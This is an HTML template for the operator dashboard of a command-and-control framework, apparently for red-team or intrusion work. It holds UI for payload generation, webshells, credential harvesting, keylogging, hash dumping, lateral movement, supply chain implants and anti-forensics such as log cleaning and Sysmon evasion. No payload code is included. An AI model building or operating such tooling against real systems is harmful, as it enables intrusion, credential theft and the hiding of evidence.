{% extends "base.html" %}
{% block head %}
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    :root {
        --bg-dark: #0a0a0f;
        --bg-card: #12121a;
        --bg-card-hover: #1a1a25;
        --border-color: #2a2a3a;
        --accent-purple: #8b5cf6;
        --accent-green: #10b981;
        --accent-red: #ef4444;
        --accent-blue: #3b82f6;
        --accent-yellow: #f59e0b;
        --text-primary: #f1f5f9;
        --text-secondary: #94a3b8;
        --text-muted: #64748b;
    }
    
    body {
        background: var(--bg-dark);
        color: var(--text-primary);
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        min-height: 100vh;
    }
    
    /* Navbar */
    .c2-navbar {
        background: linear-gradient(180deg, rgba(139, 92, 246, 0.1) 0%, transparent 100%);
        border-bottom: 1px solid var(--border-color);
        backdrop-filter: blur(20px);
        padding: 1rem 2rem;
    }
    
    .c2-brand {
        font-size: 1.5rem;
        font-weight: 700;
        background: linear-gradient(135deg, var(--accent-purple), #a78bfa);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        display: flex;
        align-items: center;
        gap: 0.75rem;
    }
    
    .c2-brand i {
        background: var(--accent-purple);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    
    /* Stats Cards */
    .stats-container {
        display: flex;
        gap: 1rem;
        padding: 1.5rem 2rem;
        background: var(--bg-card);
        border-bottom: 1px solid var(--border-color);
    }
    
    .stat-card {
        background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(59, 130, 246, 0.05));
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1rem 1.5rem;
        min-width: 150px;
        transition: all 0.3s ease;
    }
    
    .stat-card:hover {
        transform: translateY(-2px);
        border-color: var(--accent-purple);
        box-shadow: 0 8px 32px rgba(139, 92, 246, 0.15);
    }
    
    .stat-card.green { border-left: 3px solid var(--accent-green); }
    .stat-card.blue { border-left: 3px solid var(--accent-blue); }
    .stat-card.yellow { border-left: 3px solid var(--accent-yellow); }
    .stat-card.red { border-left: 3px solid var(--accent-red); }
    
    .stat-value {
        font-size: 2rem;
        font-weight: 700;
        line-height: 1;
    }
    
    .stat-card.green .stat-value { color: var(--accent-green); }
    .stat-card.blue .stat-value { color: var(--accent-blue); }
    .stat-card.yellow .stat-value { color: var(--accent-yellow); }
    .stat-card.red .stat-value { color: var(--accent-red); }
    
    .stat-label {
        font-size: 0.75rem;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        color: var(--text-secondary);
        margin-top: 0.25rem;
    }
    
    /* Main Container */
    .c2-main {
        display: flex;
        height: calc(100vh - 140px);
    }
    
    /* Sidebar Tabs */
    .c2-sidebar {
        width: 220px;
        background: var(--bg-card);
        border-right: 1px solid var(--border-color);
        padding: 1rem 0;
    }
    
    .sidebar-nav {
        list-style: none;
        padding: 0;
        margin: 0;
    }
    
    .sidebar-nav li {
        margin: 0.25rem 0.75rem;
    }
    
    .sidebar-nav a {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        padding: 0.875rem 1rem;
        border-radius: 10px;
        color: var(--text-secondary);
        text-decoration: none;
        font-weight: 500;
        transition: all 0.2s ease;
    }
    
    .sidebar-nav a:hover {
        background: var(--bg-card-hover);
        color: var(--text-primary);
    }
    
    .sidebar-nav a.active {
        background: linear-gradient(135deg, var(--accent-purple), #7c3aed);
        color: white;
        box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
    }
    
    .sidebar-nav i {
        font-size: 1.1rem;
        width: 24px;
        text-align: center;
    }
    
    /* Content Area */
    .c2-content {
        flex: 1;
        padding: 1.5rem 2rem;
        overflow-y: auto;
    }
    
    /* Cards */
    .panel {
        background: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: 16px;
        overflow: hidden;
        margin-bottom: 1.5rem;
    }
    
    .panel-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1rem 1.5rem;
        border-bottom: 1px solid var(--border-color);
        background: rgba(139, 92, 246, 0.03);
    }
    
    .panel-title {
        font-size: 1rem;
        font-weight: 600;
        display: flex;
        align-items: center;
        gap: 0.5rem;
        color: var(--text-primary);
    }
    
    .panel-title i {
        color: var(--accent-purple);
    }
    
    .panel-body {
        padding: 1.5rem;
    }
    
    /* Agent Cards */
    .agent-item {
        background: var(--bg-card-hover);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.25rem;
        margin-bottom: 1rem;
        transition: all 0.3s ease;
    }
    
    .agent-item:hover {
        border-color: var(--accent-green);
        box-shadow: 0 4px 20px rgba(16, 185, 129, 0.1);
    }
    
    .agent-item.dead {
        opacity: 0.6;
        border-color: var(--accent-red);
    }
    
    .agent-header {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        margin-bottom: 1rem;
    }
    
    .agent-name {
        font-size: 1.1rem;
        font-weight: 600;
        color: var(--text-primary);
        display: flex;
        align-items: center;
        gap: 0.5rem;
    }
    
    .agent-name i {
        color: var(--accent-green);
    }
    
    .agent-meta {
        display: flex;
        flex-wrap: wrap;
        gap: 1rem;
        font-size: 0.85rem;
        color: var(--text-secondary);
    }
    
    .agent-meta span {
        display: flex;
        align-items: center;
        gap: 0.35rem;
    }
    
    .agent-meta i {
        color: var(--text-muted);
    }
    
    /* Status Badges */
    .badge-status {
        padding: 0.35rem 0.75rem;
        border-radius: 20px;
        font-size: 0.75rem;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }
    
    .badge-active {
        background: rgba(16, 185, 129, 0.15);
        color: var(--accent-green);
        border: 1px solid rgba(16, 185, 129, 0.3);
    }
    
    .badge-dead {
        background: rgba(239, 68, 68, 0.15);
        color: var(--accent-red);
        border: 1px solid rgba(239, 68, 68, 0.3);
    }
    
    .badge-running {
        background: rgba(59, 130, 246, 0.15);
        color: var(--accent-blue);
        border: 1px solid rgba(59, 130, 246, 0.3);
    }
    
    .badge-stopped {
        background: rgba(245, 158, 11, 0.15);
        color: var(--accent-yellow);
        border: 1px solid rgba(245, 158, 11, 0.3);
    }
    
    .badge-pending {
        background: rgba(245, 158, 11, 0.15);
        color: var(--accent-yellow);
        border: 1px solid rgba(245, 158, 11, 0.3);
    }
    
    .badge-completed {
        background: rgba(16, 185, 129, 0.15);
        color: var(--accent-green);
        border: 1px solid rgba(16, 185, 129, 0.3);
    }
    
    /* Buttons */
    .btn-c2 {
        background: linear-gradient(135deg, var(--accent-purple), #7c3aed);
        border: none;
        color: white;
        padding: 0.625rem 1.25rem;
        border-radius: 8px;
        font-weight: 600;
        font-size: 0.875rem;
        transition: all 0.3s ease;
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
    }
    
    .btn-c2:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(139, 92, 246, 0.4);
        color: white;
    }
    
    .btn-ghost {
        background: transparent;
        border: 1px solid var(--border-color);
        color: var(--text-secondary);
        padding: 0.5rem 1rem;
        border-radius: 8px;
        font-size: 0.875rem;
        transition: all 0.2s ease;
    }
    
    .btn-ghost:hover {
        background: var(--bg-card-hover);
        color: var(--text-primary);
        border-color: var(--accent-purple);
    }
    
    .btn-icon {
        width: 36px;
        height: 36px;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 8px;
        border: 1px solid var(--border-color);
        background: transparent;
        color: var(--text-secondary);
        transition: all 0.2s ease;
    }
    
    .btn-icon:hover { background: var(--bg-card-hover); color: var(--text-primary); }
    .btn-icon.success:hover { border-color: var(--accent-green); color: var(--accent-green); }
    .btn-icon.warning:hover { border-color: var(--accent-yellow); color: var(--accent-yellow); }
    .btn-icon.danger:hover { border-color: var(--accent-red); color: var(--accent-red); }
    .btn-icon.primary:hover { border-color: var(--accent-blue); color: var(--accent-blue); }
    
    /* Form Controls */
    .form-label {
        font-size: 0.85rem;
        font-weight: 500;
        color: var(--text-secondary);
        margin-bottom: 0.5rem;
    }
    
    .form-control, .form-select {
        background: var(--bg-dark);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        color: var(--text-primary);
        padding: 0.75rem 1rem;
        font-size: 0.9rem;
        transition: all 0.2s ease;
    }
    
    .form-control:focus, .form-select:focus {
        background: var(--bg-dark);
        border-color: var(--accent-purple);
        box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15);
        color: var(--text-primary);
    }
    
    .form-control::placeholder {
        color: var(--text-muted);
    }
    
    /* Listener Cards */
    .listener-item {
        background: var(--bg-card-hover);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1rem 1.25rem;
        margin-bottom: 0.75rem;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: all 0.3s ease;
    }
    
    .listener-item:hover {
        border-color: var(--accent-purple);
    }
    
    .listener-info h5 {
        font-size: 1rem;
        font-weight: 600;
        margin-bottom: 0.25rem;
    }
    
    .listener-info small {
        color: var(--text-secondary);
        font-size: 0.85rem;
    }
    
    .listener-actions {
        display: flex;
        gap: 0.5rem;
        align-items: center;
    }
    
    /* Tables */
    .table-dark {
        --bs-table-bg: transparent;
        --bs-table-border-color: var(--border-color);
        color: var(--text-primary);
    }
    
    .table-dark thead th {
        background: rgba(139, 92, 246, 0.05);
        font-weight: 600;
        font-size: 0.8rem;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        color: var(--text-secondary);
        padding: 1rem;
        border-bottom: 1px solid var(--border-color);
    }
    
    .table-dark tbody td {
        padding: 1rem;
        vertical-align: middle;
        border-bottom: 1px solid var(--border-color);
    }
    
    .table-dark tbody tr:hover {
        background: var(--bg-card-hover);
    }
    
    /* Payload Output */
    .payload-output {
        background: #0d1117;
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        font-family: 'JetBrains Mono', 'Fira Code', monospace;
        font-size: 0.85rem;
        line-height: 1.6;
        max-height: 450px;
        overflow: auto;
        color: var(--accent-green);
    }
    
    .payload-output::-webkit-scrollbar {
        width: 8px;
    }
    
    .payload-output::-webkit-scrollbar-track {
        background: var(--bg-dark);
    }
    
    .payload-output::-webkit-scrollbar-thumb {
        background: var(--border-color);
        border-radius: 4px;
    }
    
    /* Empty State */
    .empty-state {
        text-align: center;
        padding: 3rem;
        color: var(--text-muted);
    }
    
    .empty-state i {
        font-size: 4rem;
        margin-bottom: 1rem;
        opacity: 0.3;
    }
    
    .empty-state p {
        font-size: 1rem;
        margin: 0;
    }
    
    /* Modal Styles */
    .modal-content {
        background: var(--bg-card);
        border: 1px solid var(--border-color);
        border-radius: 16px;
    }
    
    .modal-header {
        border-bottom: 1px solid var(--border-color);
        padding: 1.25rem 1.5rem;
    }
    
    .modal-title {
        font-weight: 600;
        color: var(--text-primary);
    }
    
    .modal-body {
        padding: 1.5rem;
    }
    
    .btn-close {
        filter: invert(1);
    }
    
    /* Tab Content */
    .tab-pane {
        display: none;
    }
    
    .tab-pane.active {
        display: block;
    }
    
    /* Grid */
    .row { display: flex; flex-wrap: wrap; margin: 0 -0.75rem; }
    .col-md-4 { flex: 0 0 33.333%; max-width: 33.333%; padding: 0 0.75rem; }
    .col-md-8 { flex: 0 0 66.666%; max-width: 66.666%; padding: 0 0.75rem; }
    .col-12 { flex: 0 0 100%; max-width: 100%; padding: 0 0.75rem; }
    
    @media (max-width: 992px) {
        .col-md-4, .col-md-8 { flex: 0 0 100%; max-width: 100%; }
        .c2-sidebar { display: none; }
    }
    
    /* Pulse Animation */
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }
    
    .pulse {
        animation: pulse 2s infinite;
    }
</style>
{% endblock %}

{% block body %}
<!-- Navbar -->
<nav class="c2-navbar">
    <div class="d-flex justify-content-between align-items-center">
        <div class="c2-brand">
            <i class="bi bi-shield-lock-fill"></i>
            MONOLITH C2
        </div>
        <div class="d-flex align-items-center gap-3">
            <a href="/" class="btn-ghost"><i class="bi bi-house"></i> Dashboard</a>
            <span class="text-muted"><i class="bi bi-person-circle"></i> {{ session.get('user', 'operator') }}</span>
        </div>
    </div>
</nav>

<!-- Stats -->
<div class="stats-container">
    <div class="stat-card green">
        <div class="stat-value" id="agentCount">{{ agents|length if agents else 0 }}</div>
        <div class="stat-label">Active Agents</div>
    </div>
    <div class="stat-card blue">
        <div class="stat-value" id="listenerCount">{{ listeners|length if listeners else 0 }}</div>
        <div class="stat-label">Listeners</div>
    </div>
    <div class="stat-card yellow">
        <div class="stat-value" id="taskCount">{{ recent_tasks|length if recent_tasks else 0 }}</div>
        <div class="stat-label">Pending Tasks</div>
    </div>
    <div class="stat-card red">
        <div class="stat-value">0</div>
        <div class="stat-label">Credentials</div>
    </div>
</div>

<!-- Main -->
<div class="c2-main">
    <!-- Sidebar -->
    <div class="c2-sidebar">
        <ul class="sidebar-nav">
            <li><a href="#" class="active" data-tab="agentsTab"><i class="bi bi-pc-display"></i> Agents</a></li>
            <li><a href="#" data-tab="listenersTab"><i class="bi bi-broadcast"></i> Listeners</a></li>
            <li><a href="#" data-tab="tasksTab"><i class="bi bi-list-task"></i> Tasks</a></li>
            <li><a href="#" data-tab="payloadsTab"><i class="bi bi-file-earmark-code"></i> Payloads</a></li>
            <li><a href="#" data-tab="credentialsTab"><i class="bi bi-key"></i> Credentials</a></li>
            <li><a href="#" data-tab="integrationsTab"><i class="bi bi-link-45deg"></i> Integrations</a></li>
        </ul>
    </div>

    <!-- Content -->
    <div class="c2-content">
        <!-- Agents Tab -->
        <div class="tab-pane active" id="agentsTab">
            <div class="panel">
                <div class="panel-header">
                    <h3 class="panel-title"><i class="bi bi-pc-display"></i> Connected Agents</h3>
                    <button class="btn-ghost" onclick="refreshAgents()"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
                </div>
                <div class="panel-body">
                    {% if agents %}
                        {% for agent in agents %}
                        <div class="agent-item {{ 'dead' if agent.status == 'dead' else '' }}">
                            <div class="agent-header">
                                <div>
                                    <div class="agent-name">
                                        <i class="bi bi-hdd-network"></i>
                                        {{ agent.hostname }}
                                    </div>
                                    <div class="agent-meta mt-2">
                                        <span><i class="bi bi-person"></i> {{ agent.username }}</span>
                                        <span><i class="bi bi-cpu"></i> {{ agent.os_info }}</span>
                                        <span><i class="bi bi-globe"></i> {{ agent.ip_address }}</span>
                                        <span><i class="bi bi-clock"></i> {{ agent.sleep_interval }}s</span>
                                    </div>
                                </div>
                                <div class="d-flex align-items-center gap-2">
                                    <span class="badge-status badge-{{ agent.status }}">{{ agent.status }}</span>
                                    <button class="btn-icon primary" onclick="interactAgent('{{ agent.agent_id }}')" title="Interact">
                                        <i class="bi bi-terminal"></i>
                                    </button>
                                    <button class="btn-icon danger" onclick="killAgent('{{ agent.agent_id }}')" title="Kill">
                                        <i class="bi bi-x-lg"></i>
                                    </button>
                                </div>
                            </div>
                        </div>
                        {% endfor %}
                    {% else %}
                        <div class="empty-state">
                            <i class="bi bi-inbox"></i>
                            <p>No agents connected yet.<br>Deploy a payload to get started.</p>
                        </div>
                    {% endif %}
                </div>
            </div>
        </div>

        <!-- Listeners Tab -->
        <div class="tab-pane" id="listenersTab">
            <div class="row">
                <div class="col-md-4">
                    <div class="panel">
                        <div class="panel-header">
                            <h3 class="panel-title"><i class="bi bi-plus-circle"></i> New Listener</h3>
                        </div>
                        <div class="panel-body">
                            <div class="mb-3">
                                <label class="form-label">Name</label>
                                <input type="text" id="listenerName" class="form-control" value="http-listener" placeholder="Listener name">
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Protocol</label>
                                <select id="listenerType" class="form-select">
                                    <option value="http">HTTP</option>
                                    <option value="https">HTTPS</option>
                                    <option value="dns">DNS</option>
                                    <option value="tcp">TCP Raw</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Bind Address</label>
                                <input type="text" id="listenerHost" class="form-control" value="0.0.0.0" placeholder="0.0.0.0">
                            </div>
                            <div class="mb-4">
                                <label class="form-label">Port</label>
                                <input type="number" id="listenerPort" class="form-control" value="8443" placeholder="8443">
                            </div>
                            <button class="btn-c2 w-100" onclick="createListener()">
                                <i class="bi bi-broadcast"></i> Create Listener
                            </button>
                        </div>
                    </div>
                </div>
                <div class="col-md-8">
                    <div class="panel">
                        <div class="panel-header">
                            <h3 class="panel-title"><i class="bi bi-broadcast"></i> Active Listeners</h3>
                        </div>
                        <div class="panel-body">
                            {% if listeners %}
                                {% for listener in listeners %}
                                <div class="listener-item">
                                    <div class="listener-info">
                                        <h5>{{ listener.name }}</h5>
                                        <small>
                                            <span class="badge-status badge-running me-2">{{ listener.listener_type|upper }}</span>
                                            {{ listener.host }}:{{ listener.port }}
                                        </small>
                                    </div>
                                    <div class="listener-actions">
                                        <span class="badge-status badge-{{ listener.status }}">{{ listener.status }}</span>
                                        <button class="btn-icon success" onclick="startListener('{{ listener.listener_id }}')" title="Start">
                                            <i class="bi bi-play-fill"></i>
                                        </button>
                                        <button class="btn-icon warning" onclick="stopListener('{{ listener.listener_id }}')" title="Stop">
                                            <i class="bi bi-pause-fill"></i>
                                        </button>
                                        <button class="btn-icon danger" onclick="deleteListener('{{ listener.listener_id }}')" title="Delete">
                                            <i class="bi bi-trash"></i>
                                        </button>
                                    </div>
                                </div>
                                {% endfor %}
                            {% else %}
                                <div class="empty-state">
                                    <i class="bi bi-broadcast"></i>
                                    <p>No listeners created yet.</p>
                                </div>
                            {% endif %}
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Tasks Tab -->
        <div class="tab-pane" id="tasksTab">
            <div class="panel">
                <div class="panel-header">
                    <h3 class="panel-title"><i class="bi bi-list-task"></i> Task Queue</h3>
                </div>
                <div class="panel-body" style="padding: 0;">
                    {% if recent_tasks %}
                    <table class="table table-dark mb-0">
                        <thead>
                            <tr>
                                <th>Agent</th>
                                <th>Command</th>
                                <th>Status</th>
                                <th>Created</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for task in recent_tasks %}
                            <tr>
                                <td><code>{{ task.agent_id[:8] if task.agent_id else '-' }}...</code></td>
                                <td><code>{{ task.command }} {{ task.args|join(' ') if task.args else '' }}</code></td>
                                <td><span class="badge-status badge-{{ task.status }}">{{ task.status }}</span></td>
                                <td>{{ task.created_at }}</td>
                                <td>
                                    {% if task.output %}
                                    <button class="btn-icon primary" onclick="showOutput('{{ task.task_id }}')">
                                        <i class="bi bi-eye"></i>
                                    </button>
                                    {% else %}-{% endif %}
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                    {% else %}
                    <div class="empty-state">
                        <i class="bi bi-list-task"></i>
                        <p>No tasks in queue.</p>
                    </div>
                    {% endif %}
                </div>
            </div>
        </div>

        <!-- Payloads Tab -->
        <div class="tab-pane" id="payloadsTab">
            <div class="row">
                <div class="col-md-4">
                    <div class="panel">
                        <div class="panel-header">
                            <h3 class="panel-title"><i class="bi bi-gear"></i> Payload Generator</h3>
                        </div>
                        <div class="panel-body">
                            <div class="mb-3">
                                <label class="form-label">Payload Type</label>
                                <select id="payloadType" class="form-select">
                                    <option value="python">Python Agent (Full)</option>
                                    <option value="python_oneliner">Python One-liner</option>
                                    <option value="powershell">PowerShell Agent</option>
                                    <option value="powershell_encoded">PowerShell Encoded</option>
                                    <option value="bash">Bash/Shell Agent</option>
                                    <option value="php">PHP Beacon/Webshell</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">C2 Server URL</label>
                                <input type="text" id="payloadC2Url" class="form-control" placeholder="http://attacker:8080/c2/beacon">
                                <small class="text-muted">Leave empty for current server</small>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Sleep Interval (seconds)</label>
                                <input type="number" id="payloadSleep" class="form-control" value="30">
                            </div>
                            <div class="mb-4">
                                <label class="form-label">Jitter (%)</label>
                                <input type="number" id="payloadJitter" class="form-control" value="10">
                            </div>
                            
                            <!-- God Mode Anti-Forensics -->
                            <div class="mb-4 p-3 rounded" style="background: linear-gradient(135deg, rgba(168, 85, 247, 0.1), rgba(239, 68, 68, 0.1)); border: 1px solid rgba(168, 85, 247, 0.3);">
                                <label class="d-flex align-items-center justify-content-between cursor-pointer mb-2" style="cursor: pointer;">
                                    <span style="color: #a855f7; font-weight: 600;"><span style="margin-right: 0.5rem;">üíÄ</span> God Mode Anti-Forensics</span>
                                    <input type="checkbox" id="godModePayload" style="accent-color: #a855f7;">
                                </label>
                                <div id="godModePayloadOpts" style="display: none; font-size: 0.75rem;">
                                    <div class="d-flex flex-wrap gap-2">
                                        <label style="color: #9ca3af; cursor: pointer;"><input type="checkbox" id="gmPyTimestomp" checked style="accent-color: #a855f7; margin-right: 0.25rem;"> üïê Auto-Timestomp</label>
                                        <label style="color: #9ca3af; cursor: pointer;"><input type="checkbox" id="gmPyCleanLogs" checked style="accent-color: #a855f7; margin-right: 0.25rem;"> üëª Event Log Cleaner</label>
                                        <label style="color: #9ca3af; cursor: pointer;"><input type="checkbox" id="gmPySysmonEvade" style="accent-color: #a855f7; margin-right: 0.25rem;"> ‚ò†Ô∏è Sysmon Evade</label>
                                    </div>
                                </div>
                            </div>
                            
                            <button class="btn-c2 w-100" onclick="generatePayload()">
                                <i class="bi bi-lightning-charge"></i> Generate Payload
                            </button>
                        </div>
                    </div>
                </div>
                <div class="col-md-8">
                    <div class="panel">
                        <div class="panel-header">
                            <h3 class="panel-title"><i class="bi bi-code-slash"></i> Generated Payload</h3>
                            <div class="d-flex gap-2">
                                <button class="btn-ghost" onclick="copyPayload()"><i class="bi bi-clipboard"></i> Copy</button>
                                <button class="btn-ghost" onclick="downloadPayload()"><i class="bi bi-download"></i> Download</button>
                            </div>
                        </div>
                        <div class="panel-body">
                            <div id="payloadOutput" class="payload-output">
                                <span style="color: var(--text-muted);"># Click "Generate Payload" to create agent code...</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Credentials Tab -->
        <div class="tab-pane" id="credentialsTab">
            <div class="panel">
                <div class="panel-header">
                    <h3 class="panel-title"><i class="bi bi-key"></i> Harvested Credentials</h3>
                </div>
                <div class="panel-body" style="padding: 0;">
                    <table class="table table-dark mb-0">
                        <thead>
                            <tr>
                                <th>Type</th>
                                <th>Domain</th>
                                <th>Username</th>
                                <th>Password / Hash</th>
                                <th>Source</th>
                            </tr>
                        </thead>
                        <tbody id="credsTable">
                            <tr>
                                <td colspan="5" class="text-center" style="padding: 3rem; color: var(--text-muted);">
                                    <i class="bi bi-key" style="font-size: 2rem; opacity: 0.3;"></i>
                                    <p class="mt-2 mb-0">No credentials harvested yet.</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Cross-Module Integration -->
        <div class="tab-pane" id="integrationsTab">
            <div class="row">
                <div class="col-12">
                    <div class="panel">
                        <div class="panel-header">
                            <h3 class="panel-title"><i class="bi bi-link-45deg"></i> Cross-Module Integration</h3>
                        </div>
                        <div class="panel-body">
                            <p class="text-muted mb-4">Deploy C2 implants through other attack vectors or chain modules together</p>
                            
                            <div class="row g-3">
                                <!-- DLL Sideload Integration -->
                                <div class="col-md-4">
                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
                                        <div class="d-flex align-items-center mb-2">
                                            <i class="bi bi-puzzle text-warning me-2"></i>
                                            <strong>DLL Sideload</strong>
                                        </div>
                                        <p class="text-muted small mb-3">Package implant as sideloadable DLL</p>
                                        <button class="btn-ghost w-100" onclick="openDllSideload()">
                                            <i class="bi bi-box-arrow-up-right"></i> Open DLL Sideload
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- WMI Persistence Integration -->
                                <div class="col-md-4">
                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
                                        <div class="d-flex align-items-center mb-2">
                                            <i class="bi bi-database text-info me-2"></i>
                                            <strong>WMI Persistence</strong>
                                        </div>
                                        <p class="text-muted small mb-3">Persist implant via WMI subscriptions</p>
                                        <button class="btn-ghost w-100" onclick="openWmiPersistence()">
                                            <i class="bi bi-box-arrow-up-right"></i> Open WMI Persistence
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Lateral Movement Integration -->
                                <div class="col-md-4">
                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
                                        <div class="d-flex align-items-center mb-2">
                                            <i class="bi bi-diagram-3 text-success me-2"></i>
                                            <strong>Lateral Movement</strong>
                                        </div>
                                        <p class="text-muted small mb-3">Deploy implant to remote hosts</p>
                                        <button class="btn-ghost w-100" onclick="openLateralMovement()">
                                            <i class="bi bi-box-arrow-up-right"></i> Open Lateral Movement
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Supply Chain Integration -->
                                <div class="col-md-4">
                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
                                        <div class="d-flex align-items-center mb-2">
                                            <i class="bi bi-boxes text-danger me-2"></i>
                                            <strong>Supply Chain Attack</strong>
                                        </div>
                                        <p class="text-muted small mb-3">Embed implant in packages</p>
                                        <button class="btn-ghost w-100" onclick="openSupplyChain()">
                                            <i class="bi bi-box-arrow-up-right"></i> Open Supply Chain
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Golden Ticket Integration -->
                                <div class="col-md-4">
                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
                                        <div class="d-flex align-items-center mb-2">
                                            <i class="bi bi-ticket-detailed text-warning me-2"></i>
                                            <strong>Golden Ticket</strong>
                                        </div>
                                        <p class="text-muted small mb-3">Deploy implant to DC post-compromise</p>
                                        <button class="btn-ghost w-100" onclick="openGoldenTicket()">
                                            <i class="bi bi-box-arrow-up-right"></i> Open Golden Ticket
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- DPAPI Extractor Integration -->
                                <div class="col-md-4">
                                    <div class="p-3 rounded" style="background: var(--bg-dark); border: 1px solid var(--border-color);">
                                        <div class="d-flex align-items-center mb-2">
                                            <i class="bi bi-key text-purple me-2" style="color: #a855f7;"></i>
                                            <strong>DPAPI Extractor</strong>
                                        </div>
                                        <p class="text-muted small mb-3">Extract credentials from agents</p>
                                        <button class="btn-ghost w-100" onclick="openDpapiExtractor()">
                                            <i class="bi bi-box-arrow-up-right"></i> Open DPAPI Extractor
                                        </button>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Quick Deploy Section -->
                            <div class="mt-4 p-3 rounded" style="background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(59, 130, 246, 0.1)); border: 1px solid rgba(139, 92, 246, 0.3);">
                                <h5 class="mb-3" style="color: var(--accent-purple);"><i class="bi bi-lightning-charge me-2"></i>Quick Deploy to Agent</h5>
                                <div class="row g-3">
                                    <div class="col-md-4">
                                        <select id="deployAgent" class="form-select">
                                            <option value="">Select Agent...</option>
                                            {% for agent in agents %}
                                            <option value="{{ agent.agent_id }}">{{ agent.hostname }} ({{ agent.ip_address }})</option>
                                            {% endfor %}
                                        </select>
                                    </div>
                                    <div class="col-md-4">
                                        <select id="deployModule" class="form-select">
                                            <option value="">Select Module...</option>
                                            <option value="dpapi">üîë DPAPI Credential Extract</option>
                                            <option value="hashdump">üîê SAM/NTDS Hash Dump</option>
                                            <option value="lateral_smb">üîÑ Lateral via SMB</option>
                                            <option value="lateral_wmi">üîÑ Lateral via WMI</option>
                                            <option value="persist_wmi">‚öì WMI Persistence</option>
                                            <option value="persist_schtask">‚öì Scheduled Task Persist</option>
                                            <option value="privesc">‚¨ÜÔ∏è PrivEsc Check</option>
                                        </select>
                                    </div>
                                    <div class="col-md-4">
                                        <button class="btn-c2 w-100" onclick="quickDeploy()">
                                            <i class="bi bi-send"></i> Deploy Module
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Agent Modal -->
<div class="modal fade" id="agentModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title"><i class="bi bi-terminal"></i> Agent Interaction</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div class="mb-3">
                    <label class="form-label">Command Type</label>
                    <select id="taskCommand" class="form-select mb-3">
                        <option value="shell">Shell Command</option>
                        <option value="download">Download File</option>
                        <option value="upload">Upload File</option>
                        <option value="screenshot">Screenshot</option>
                        <option value="keylogger">Keylogger</option>
                        <option value="hashdump">Hash Dump</option>
                        <option value="migrate">Process Migration</option>
                    </select>
                    <input type="text" id="taskArgs" class="form-control" placeholder="Enter command or arguments...">
                </div>
                <button class="btn-c2" onclick="sendTask()">
                    <i class="bi bi-send"></i> Execute
                </button>
                <hr style="border-color: var(--border-color); margin: 1.5rem 0;">
                <h6 style="color: var(--text-secondary); margin-bottom: 1rem;">Task History</h6>
                <div id="agentTaskHistory" style="max-height: 250px; overflow-y: auto;"></div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
let currentAgentId = null;
let generatedPayload = '';

// Tab Navigation
document.querySelectorAll('.sidebar-nav a').forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        document.querySelectorAll('.sidebar-nav a').forEach(l => l.classList.remove('active'));
        this.classList.add('active');
        document.querySelectorAll('.tab-pane').forEach(t => t.classList.remove('active'));
        document.getElementById(this.dataset.tab).classList.add('active');
    });
});

// Load beacons on page load
document.addEventListener('DOMContentLoaded', () => {
    refreshBeacons();
    loadStats();
    loadLoot();
});
